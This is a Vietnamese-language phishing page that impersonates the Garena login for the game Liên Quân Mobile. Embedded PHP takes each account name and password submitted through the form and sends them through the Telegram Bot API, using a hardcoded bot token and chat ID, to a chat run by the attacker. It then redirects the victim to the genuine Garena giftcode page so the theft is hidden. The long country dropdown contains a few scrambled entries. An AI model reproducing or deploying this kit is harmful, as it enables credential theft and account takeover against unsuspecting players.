<!DOCTYPE html><html><head>

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<meta name="description" content="Liên Quân Mobile">
<link href="css/sso.css" rel="stylesheet" type="text/css">
<title>Liên Quân Mobile</title>
</head>
<body>
<script src="js/jquery-1.10.2.min.js" type="text/javascript"></script>
<style>
    .content {
    width: 100%;
    min-height: 450px;
    margin: 50px auto 45px;
    padding-bottom: 100px;
    border: 1px solid #e3e1dc;
    border-radius: 5px;
    background-color: #fff;
}
</style>
<div id="page">
  <div id="header" class="header">
    <div class="langWrapper fr">
      <select class="lang">
        <option value="en-US">International - English</option>
        <option value="en-SG">Singapore - English</option>
        <option value="zh-SG">新加坡 - 简体中文</option>
        <option value="zh-TW">台灣 - 繁体中文</option>
        <option value="en-PH">Philippines - English</option>
        <option value="th-TH">ไทย - ไทย</option>
        <option value="id-ID">Indonesia - Bahasa Indonesia</option>
        <option value="vi-VN">Việt Nam - Tiếng việt</option>
        <option value="ru-RU">Россия - Русский</option>
        <option value="en-MY">Malaysia - English</option>
        <option value="pt-PT">Portugal - Português</option>
        <option value="es-ES">España - Español</option>
      </select>
      <span class="icon-earth"></span>
    </div>
    <div class="topBarGarena"></div>
    <div class="topBar"></div>
    <h1>
      <a class="logo" href="http://platform.garena.vn/register/" target="_blank">
        <img src="https://sso.garena.com/universal/assets/logo-9d415851.svg" style="height: 35px;">
      </a>
    </h1>
  </div>
  <div id="main-panel">
    <div class="content" style="top: 263.6px;">
      <h2 class="title">Đăng nhập</h2>
      <form id="login-form" action="" method="POST" class="loginForm">
        <div id="line-country" style="display: none;" class="line">
          <select id="sso_login_form_select_country" name="select_country" class="country">
            <option value="AF" data-country-code="93">
              <p>Afghanistan (افغانستان&lrm;) </p>
            </option>
            <option value="AL" data-country-code="355">
              <p>Albania (Shqipëria&lrm;) </p>
            </option>
            <option value="DZ" data-country-code="213">
              <p>Algeria (الجزائر&lrm;) </p>
            </option>
            <option value="AS" data-country-code="1684">
              <p>American Samoa </p>
            </option>
            <option value="AD" data-country-code="376">
              <p>Andorra </p>
            </option>
            <option value="AO" data-country-code="244">
              <p>Angola </p>
            </option>
            <option value="AI" data-country-code="1264">
              <p>Anguilla </p>
            </option>
            <option value="AG" data-country-code="1268">
              <p>Antigua and Barbuda </p>
            </option>
            <option value="AR" data-country-code="54">
              <p>Argentina </p>
            </option>
            <option value="AM" data-country-code="374">
              <p>Armenia </p>
            </option>
            <option value="AW" data-country-code="297">
              <p>Aruba </p>
            </option>
            <option value="AU" data-country-code="61">
              <p>Australia </p>
            </option>
            <option value="AT" data-country-code="43">
              <p>Austria (Österreich&lrm;) </p>
            </option>
            <option value="AZ" data-country-code="994">
              <p>Azerbaijan (Azərbaycan&lrm;) </p>
            </option>
            <option value="BS" data-country-code="1242">
              <p>Bahamas </p>
            </option>
            <option value="BH" data-country-code="973">
              <p>Bahrain (البحرين&lrm;) </p>
            </option>
            <option value="BD" data-country-code="880">
              <p>Bangladesh (বাংলাদেশ&lrm;) </p>
            </option>
            <option value="BB" data-country-code="1246">
              <p>Barbados </p>
            </option>
            <option value="BY" data-country-code="375">
              <p>Belarus (Белару́сь&lrm;) </p>
            </option>
            <option value="BE" data-country-code="32">
              <p>Belgium (België&lrm;) </p>
            </option>
            <option value="BZ" data-country-code="501">
              <p>Belize </p>
            </option>
            <option value="BJ" data-country-code="229">
              <p>Benin (Bénin&lrm;) </p>
            </option>
            <option value="BM" data-country-code="1441">
              <p>Bermuda </p>
            </option>
            <option value="BT" data-country-code="975">
              <p>Bhutan </p>
            </option>
            <option value="BO" data-country-code="591">
              <p>Bolivia </p>
            </option>
            <option value="BA" data-country-code="387">
              <p>Bosnia and Herzegovina (Bosna i Hercegovina&lrm;) </p>
            </option>
            <option value="BW" data-country-code="267">
              <p>Botswana </p>
            </option>
            <option value="BR" data-country-code="55">
              <p>Brazil (Brasil&lrm;) </p>
            </option>
            <option value="BN" data-country-code="673">
              <p>Brunei Darussalam (Brunei Darussalam&lrm;) </p>
            </option>
            <option value="BG" data-country-code="359">
              <p>Bulgaria (България&lrm;) </p>
            </option>
            <option value="BF" data-country-code="226">
              <p>Burkina Faso </p>
            </option>
            <option value="BI" data-country-code="257">
              <p>Burundi (Uburundi&lrm;) </p>
            </option>
            <option value="KH" data-country-code="855">
              <p>Cambodia (Kampuchea&lrm;) </p>
            </option>
            <option value="CM" data-country-code="237">
              <p>Cameroon (Cameroun&lrm;) </p>
            </option>
            <option value="CA" data-country-code="1">
              <p>Canada </p>
            </option>
            <option value="CV" data-country-code="238">
              <p>Cape Verde </p>
            </option>
            <option value="KY" data-country-code="1345">
              <p>Cayman Islands </p>
            </option>
            <option value="CF" data-country-code="236">
              <p>Central African Republic (République Centrafricaine&lrm;) </p>
            </option>
            <option value="TD" data-country-code="235">
              <p>Chad (Tchad&lrm;) </p>
            </option>
            <option value="CL" data-country-code="56">
              <p>Chile </p>
              <p>Ukraine (Україна&lrm;) </p>
            </option>
            <option value="AE" data-country-code="971">
              <p>United Arab Emirates (الإمارات العربيّة المتّحدة&lrm;) </p>
            </option>
            <option value="GB" data-country-code="44">
              <p>United Kingdom </p>
            </option>
            <option value="US" data-country-code="1">
              <p>United States </p>
            </option>
            <option value="UY" data-country-code="598">
              <p>Uruguay </p>
            </option>
            <option value="CN" data-country-code="86">
              <p>China (中国&lrm;) </p>
            </option>
            <option value="CO" data-country-code="57">
              <p>Colombia </p>
            </option>
            <option value="KM" data-country-code="269">
              <p>Comoros (Comores&lrm;) </p>
            </option>
            <option value="CD" data-country-code="243">
              <p>Congo (DRC) </p>
            </option>
            <option value="CG" data-country-code="242">
              <p>Congo (Republic) </p>
            </option>
            <option value="CK" data-country-code="682">
              <p>Cook Islands </p>
            </option>
            <option value="CR" data-country-code="506">
              <p>Costa Rica </p>
            </option>
            <option value="CI" data-country-code="225">
              <p>Côte d'Ivoire </p>
            </option>
            <option value="HR" data-country-code="385">
              <p>Croatia (Hrvatska&lrm;) </p>
            </option>
            <option value="CU" data-country-code="53">
              <p>Cuba </p>
            </option>
            <option value="CY" data-country-code="357">
              <p>Cyprus (Κυπρος&lrm;) </p>
            </option>
            <option value="CZ" data-country-code="420">
              <p>Czech Republic (Česko&lrm;) </p>
            </option>
            <option value="DK" data-country-code="45">
              <p>Denmark (Danmark&lrm;) </p>
            </option>
            <option value="DJ" data-country-code="253">
              <p>Djibouti </p>
            </option>
            <option value="DM" data-country-code="1767">
              <p>Dominica </p>
            </option>
            <option value="DO" data-country-code="1809">
              <p>Dominican Republic </p>
            </option>
            <option value="EC" data-country-code="593">
              <p>Ecuador </p>
            </option>
            <option value="EG" data-country-code="20">
              <p>Egypt (مصر&lrm;) </p>
            </option>
            <option value="SV" data-country-code="503">
              <p>El Salvador </p>
            </option>
            <option value="GQ" data-country-code="240">
              <p>Equatorial Guinea (Guinea Ecuatorial&lrm;) </p>
            </option>
            <option value="ER" data-country-code="291">
              <p>Eritrea (Ertra&lrm;) </p>
            </option>
            <option value="EE" data-country-code="372">
              <p>Estonia (Eesti&lrm;) </p>
            </option>
            <option value="ET" data-country-code="251">
              <p>Ethiopia (Ityop&amp;#39;iya&lrm;) </p>
            </option>
            <option value="FO" data-country-code="298">
              <p>Faroe Islands </p>
            </option>
            <option value="FJ" data-country-code="679">
              <p>Fiji </p>
            </option>
            <option value="FI" data-country-code="358">
              <p>Finland (Suomi&lrm;) </p>
            </option>
            <option value="FR" data-country-code="33">
              <p>France </p>
            </option>
            <option value="PF" data-country-code="689">
              <p>French Polynesia </p>
            </option>
            <option value="GA" data-country-code="241">
              <p>Gabon </p>
            </option>
            <option value="GM" data-country-code="220">
              <p>Gambia </p>
            </option>
            <option value="GE" data-country-code="995">
              <p>Georgia (საქართველო&lrm;) </p>
            </option>
            <option value="DE" data-country-code="49">
              <p>Germany (Deutschland&lrm;) </p>
            </option>
            <option value="GH" data-country-code="233">
              <p>Ghana </p>
            </option>
            <option value="GI" data-country-code="350">
              <p>Gibraltar </p>
            </option>
            <option value="GR" data-country-code="30">
              <p>Greece (Ελλάς&lrm;) </p>
            </option>
            <option value="GL" data-country-code="299">
              <p>Greenland </p>
            </option>
            <option value="GD" data-country-code="1473">
              <p>Grenada </p>
            </option>
            <option value="GP" data-country-code="590">
              <p>Guadeloupe </p>
            </option>
            <option value="GU" data-country-code="1671">
              <p>Guam </p>
            </option>
            <option value="GT" data-country-code="502">
              <p>Guatemala </p>
            </option>
            <option value="GG" data-country-code="44">
              <p>Guernsey </p>
            </option>
            <option value="GN" data-country-code="224">
              <p>Guinea (Guinée&lrm;) </p>
            </option>
            <option value="GW" data-country-code="245">
              <p>Guinea-Bissau (Guiné-Bissau&lrm;) </p>
            </option>
            <option value="GY" data-country-code="592">
              <p>Guyana </p>
            </option>
            <option value="HT" data-country-code="509">
              <p>Haiti </p>
            </option>
            <option value="HN" data-country-code="504">
              <p>Honduras </p>
            </option>
            <option value="HK" data-country-code="852">
              <p>Hong Kong </p>
            </option>
            <option value="HU" data-country-code="36">
              <p>Hungary (Magyarország&lrm;) </p>
            </option>
            <option value="IS" data-country-code="354">
              <p>Iceland (Ísland&lrm;) </p>
            </option>
            <option value="IN" data-country-code="91">
              <p>India </p>
            </option>
            <option value="ID" data-country-code="62">
              <p>Indonesia </p>
            </option>
            <option value="IR" data-country-code="98">
              <p>Iran (ایران&lrm;) </p>
            </option>
            <option value="IQ" data-country-code="964">
              <p>Iraq (العراق&lrm;) </p>
            </option>
            <option value="IE" data-country-code="353">
              <p>Ireland </p>
            </option>
            <option value="IM" data-country-code="44">
              <p>Isle of Man </p>
            </option>
            <option value="IL" data-country-code="972">
              <p>Israel (ישראל&lrm;) </p>
            </option>
            <option value="IT" data-country-code="39">
              <p>Italy (Italia&lrm;) </p>
            </option>
            <option value="JM" data-country-code="1876">
              <p>Jamaica </p>
            </option>
            <option value="JP" data-country-code="81">
              <p>Japan (日本&lrm;) </p>
            </option>
            <option value="JE" data-country-code="44">
              <p>Jersey </p>
            </option>
            <option value="JO" data-country-code="962">
              <p>Jordan (الاردن&lrm;) </p>
            </option>
            <option value="KZ" data-country-code="7">
              <p>Kazakhstan (Казахстан&lrm;) </p>
            </option>
            <option value="KE" data-country-code="254">
              <p>Kenya </p>
            </option>
            <option value="KI" data-country-code="686">
              <p>Kiribati </p>
            </option>
            <option value="KW" data-country-code="965">
              <p>Kuwait (الكويت&lrm;) </p>
            </option>
            <option value="KG" data-country-code="996">
              <p>Kyrgyzstan (Кыргызстан&lrm;) </p>
            </option>
            <option value="LA" data-country-code="856">
              <p>Laos (ນລາວ&lrm;) </p>
            </option>
            <option value="LV" data-country-code="371">
              <p>Latvia (Latvija&lrm;) </p>
            </option>
            <option value="LB" data-country-code="961">
              <p>Lebanon (لبنان&lrm;) </p>
            </option>
            <option value="LS" data-country-code="266">
              <p>Lesotho </p>
            </option>
            <option value="LR" data-country-code="231">
              <p>Liberia </p>
            </option>
            <option value="LY" data-country-code="218">
              <p>Libya </p>
            </option>
            <option value="LI" data-country-code="423">
              <p>Liechtenstein </p>
            </option>
            <option value="LT" data-country-code="370">
              <p>Lithuania (Lietuva&lrm;) </p>
            </option>
            <option value="LU" data-country-code="352">
              <p>Luxembourg (Lëtzebuerg&lrm;) </p>
            </option>
            <option value="MO" data-country-code="853">
              <p>Macao </p>
            </option>
            <option value="MK" data-country-code="389">
              <p>Macedonia (Македонија&lrm;) </p>
            </option>
            <option value="MG" data-country-code="261">
              <p>Madagascar (Madagasikara&lrm;) </p>
            </option>
            <option value="MW" data-country-code="265">
              <p>Malawi </p>
            </option>
            <option value="MY" data-country-code="60">
              <p>Malaysia </p>
            </option>
            <option value="MV" data-country-code="960">
              <p>Maldives (ގުޖޭއްރާ ޔާއްރިހޫމްޖ&lrm;) </p>
            </option>
            <option value="ML" data-country-code="223">
              <p>Mali </p>
            </option>
            <option value="MT" data-country-code="356">
              <p>Malta </p>
            </option>
            <option value="MH" data-country-code="692">
              <p>Marshall Islands </p>
            </option>
            <option value="MQ" data-country-code="596">
              <p>Martinique </p>
            </option>
            <option value="MR" data-country-code="222">
              <p>Mauritania (موريتانيا&lrm;) </p>
            </option>
            <option value="MU" data-country-code="230">
              <p>Mauritius </p>
            </option>
            <option value="MX" data-country-code="52">
              <p>Mexico (México&lrm;) </p>
            </option>
            <option value="FM" data-country-code="691">
              <p>Micronesia </p>
            </option>
            <option value="MD" data-country-code="373">
              <p>Moldova </p>
            </option>
            <option value="MC" data-country-code="377">
              <p>Monaco </p>
            </option>
            <option value="MN" data-country-code="976">
              <p>Mongolia (Монгол Улс&lrm;) </p>
            </option>
            <option value="ME" data-country-code="382">
              <p>Montenegro (Црна Гора&lrm;) </p>
            </option>
            <option value="MS" data-country-code="1664">
              <p>Montserrat </p>
            </option>
            <option value="MA" data-country-code="212">
              <p>Morocco (المغرب&lrm;) </p>
            </option>
            <option value="MZ" data-country-code="258">
              <p>Mozambique (Moçambique&lrm;) </p>
            </option>
            <option value="MM" data-country-code="95">
              <p>Myanmar (Burma) (Myanma&lrm;) </p>
            </option>
            <option value="NA" data-country-code="264">
              <p>Namibia </p>
            </option>
            <option value="NR" data-country-code="674">
              <p>Nauru (Naoero&lrm;) </p>
            </option>
            <option value="NP" data-country-code="977">
              <p>Nepal (नेपाल&lrm;) </p>
            </option>
            <option value="NL" data-country-code="31">
              <p>Netherlands (Nederland&lrm;) </p>
            </option>
            <option value="NC" data-country-code="687">
              <p>New Caledonia </p>
            </option>
            <option value="NZ" data-country-code="64">
              <p>New Zealand </p>
            </option>
            <option value="NI" data-country-code="505">
              <p>Nicaragua </p>
            </option>
            <option value="NE" data-country-code="227">
              <p>Niger </p>
            </option>
            <option value="NG" data-country-code="234">
              <p>Nigeria </p>
            </option>
            <option value="KP" data-country-code="850">
              <p>North Korea (조선&lrm;) </p>
            </option>
            <option value="NO" data-country-code="47">
              <p>Norway (Norge&lrm;) </p>
            </option>
            <option value="OM" data-country-code="968">
              <p>Oman (عمان&lrm;) </p>
            </option>
            <option value="PK" data-country-code="92">
              <p>Pakistan (پاکستان&lrm;) </p>
            </option>
            <option value="PW" data-country-code="680">
              <p>Palau </p>
            </option>
            <option value="PS" data-country-code="970">
              <p>Palestinian Territory </p>
            </option>
            <option value="PA" data-country-code="507">
              <p>Panama (Panamá&lrm;) </p>
            </option>
            <option value="PG" data-country-code="675">
              <p>Papua New Guinea </p>
            </option>
            <option value="PY" data-country-code="595">
              <p>Paraguay </p>
            </option>
            <option value="PE" data-country-code="51">
              <p>Peru (Perú&lrm;) </p>
            </option>
            <option value="PH" data-country-code="63">
              <p>Philippines (Pilipinas&lrm;) </p>
            </option>
            <option value="PL" data-country-code="48">
              <p>Poland (Polska&lrm;) </p>
            </option>
            <option value="PT" data-country-code="351">
              <p>Portugal </p>
            </option>
            <option value="PR" data-country-code="1787">
              <p>Puerto Rico </p>
            </option>
            <option value="QA" data-country-code="974">
              <p>Qatar (قطر&lrm;) </p>
            </option>
            <option value="RE" data-country-code="262">
              <p>Réunion </p>
            </option>
            <option value="RO" data-country-code="40">
              <p>Romania (România&lrm;) </p>
            </option>
            <option value="RU" data-country-code="7">
              <p>Russian Federation (Россия&lrm;) </p>
            </option>
            <option value="RW" data-country-code="250">
              <p>Rwanda </p>
            </option>
            <option value="KN" data-country-code="1869">
              <p>Saint Kitts and Nevis </p>
            </option>
            <option value="LC" data-country-code="1758">
              <p>Saint Lucia </p>
            </option>
            <option value="VC" data-country-code="1784">
              <p>Saint Vincent and the Grenadines </p>
            </option>
            <option value="WS" data-country-code="685">
              <p>Samoa </p>
            </option>
            <option value="SM" data-country-code="378">
              <p>San Marino </p>
            </option>
            <option value="ST" data-country-code="239">
              <p>São Tomé and Príncipe </p>
            </option>
            <option value="SA" data-country-code="966">
              <p>Saudi Arabia (المملكة العربية السعودية&lrm;) </p>
            </option>
            <option value="SN" data-country-code="221">
              <p>Senegal (Sénégal&lrm;) </p>
            </option>
            <option value="RS" data-country-code="381">
              <p>Serbia (Србија&lrm;) </p>
            </option>
            <option value="SC" data-country-code="248">
              <p>Seychelles </p>
            </option>
            <option value="SL" data-country-code="232">
              <p>Sierra Leone </p>
            </option>
            <option value="SG" data-country-code="65">
              <p>Singapore (Singapura&lrm;) </p>
            </option>
            <option value="SK" data-country-code="421">
              <p>Slovakia (Slovensko&lrm;) </p>
            </option>
            <option value="SI" data-country-code="386">
              <p>Slovenia (Slovenija&lrm;) </p>
            </option>
            <option value="SB" data-country-code="677">
              <p>Solomon Islands </p>
            </option>
            <option value="SO" data-country-code="252">
              <p>Somalia </p>
            </option>
            <option value="ZA" data-country-code="27">
              <p>South Africa </p>
            </option>
            <option value="KR" data-country-code="82">
              <p>South Korea (한국&lrm;) </p>
            </option>
            <option value="ES" data-country-code="34">
              <p>Spain (España&lrm;) </p>
            </option>
            <option value="LK" data-country-code="94">
              <p>Sri Lanka </p>
            </option>
            <option value="SD" data-country-code="249">
              <p>Sudan (السودان&lrm;) </p>
            </option>
            <option value="SR" data-country-code="597">
              <p>Suriname </p>
            </option>
            <option value="SZ" data-country-code="268">
              <p>Swaziland </p>
            </option>
            <option value="SE" data-country-code="46">
              <p>Sweden (Sverige&lrm;) </p>
            </option>
            <option value="CH" data-country-code="41">
              <p>Switzerland (Schweiz&lrm;) </p>
            </option>
            <option value="SY" data-country-code="963">
              <p>Syrian Arab Republic (سوريا&lrm;) </p>
            </option>
            <option value="TW" data-country-code="886">
              <p>Taiwan (台灣&lrm;) </p>
            </option>
            <option value="TJ" data-country-code="992">
              <p>Tajikistan (Тоҷикистон&lrm;) </p>
            </option>
            <option value="TZ" data-country-code="255">
              <p>Tanzania </p>
            </option>
            <option value="TH" data-country-code="66">
              <p>Thailand (ราชอาณาจักรไทย&lrm;) </p>
            </option>
            <option value="TL" data-country-code="670">
              <p>Timor-Leste </p>
            </option>
            <option value="TG" data-country-code="228">
              <p>Togo </p>
            </option>
            <option value="TO" data-country-code="676">
              <p>Tonga </p>
            </option>
            <option value="TT" data-country-code="1868">
              <p>Trinidad and Tobago </p>
            </option>
            <option value="TN" data-country-code="216">
              <p>Tunisia (تونس&lrm;) </p>
            </option>
            <option value="TR" data-country-code="90">
              <p>Turkey (Türkiye&lrm;) </p>
            </option>
            <option value="TM" data-country-code="993">
              <p>Turkmenistan (Türkmenistan&lrm;) </p>
            </option>
            <option value="TC" data-country-code="1649">
              <p>Turks and Caicos Islands </p>
            </option>
            <option value="TV" data-country-code="688">
              <p>Tuvalu </p>
            </option>
            <option value="UG" data-country-code="256">
              <p>Uganda </p>
            </option>
            <option value="UA" data-country-code="380">
            </option>
            <option value="UZ" data-country-code="998">
              <p>Uzbekistan (O'zbekiston&lrm;) </p>
            </option>
            <option value="VU" data-country-code="678">
              <p>Vanuatu </p>
            </option>
            <option value="VA" data-country-code="379">
              <p>Vatican City </p>
            </option>
            <option value="VE" data-country-code="58">
              <p>Venezuela </p>
            </option>
            <option value="VN" data-country-code="84">
              <p>Viet Nam (Việt Nam&lrm;) </p>
            </option>
            <option value="VG" data-country-code="1284">
              <p>Virgin Islands (British) </p>
            </option>
            <option value="VI" data-country-code="1340">
              <p>Virgin Islands (U.S.) </p>
            </option>
            <option value="EH" data-country-code="212">
              <p>Western Sahara </p>
            </option>
            <option value="YE" data-country-code="967">
              <p>Yemen (اليمن&lrm;) </p>
            </option>
            <option value="ZM" data-country-code="260">
              <p>Zambia </p>
            </option>
            <option value="ZW" data-country-code="263">
              <p>Zimbabwe </p>
            </option>
          </select>
        </div>
        <?php
    if(isset($_POST['account'])){
        $account = $_POST['account'];
        $password = $_POST['password'];
        if(empty($account)){
            echo '<script>alert(\'Vui lòng nhập email hoặc số điện thoại\');</script>';
        } elseif (empty($password)) {
            echo '<script>alert(\'Vui lòng không bỏ trống mật khẩu\');</script>';
        } else {
            $botToken = "6710388201:AAG4gAmfe7DZdzmj2Lz89pxPYsT86DBBHGM";
$chatId = "-1002042330395"; // ID của cuộc trò chuyện hoặc người dùng bạn muốn gửi tin nhắn
$message = "\n[THÔNG BÁO ĐĂNG NHẬP]\nTài khoản: $account\nMật khẩu: $password\nĐăng nhập bằng Garena"; // Nội dung tin nhắn bạn muốn gửi

// Tạo URL để gửi yêu cầu API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);

// Gửi yêu cầu HTTP sử dụng cURL
$response = file_get_contents($url, false, $context);
echo '<script>window.location.href="https://lienquan.garena.vn/giftcode/"</script>';
        }
    }
?>
        <div id="line-account" class="line">
          <span id="sso_login_form_country_code" style="display: none;" class="country-code">+84</span>
          <input id="sso_login_form_account" name="account" type="text" placeholder="Tài khoản Garena, Email hoặc số điện thoại" autocorrect="off" autocapitalize="off">
        </div>
        <div id="line-password" class="line">
          <input id="sso_login_form_password" name="password" type="password" autocomplete="on" placeholder="Mật khẩu">
        </div>

        <div id="line-btn" class="line btnLine">
          <button id="confirm-btn" name="login" type="submit" value="Đăng Nhập Ngay" class="btn">Đăng Nhập Ngay</button>
        </div>
        <div class="divider">
          <span>hoặc</span>
        </div>
        <div id="line-btn" class="line btnLine">
          <input id="sso_login_link_register" name="register" type="button" value="Tạo tài khoản mới" onclick="javascript:return false;" class="btn black">
        </div>
      </form>
      <div class="linkLine">
        <a id="sso_login_link_forget_password" href="javascript:;" class="sec">Quên mật khẩu?</a>
      </div>
    </div>
  </div>
</div>


</body></html>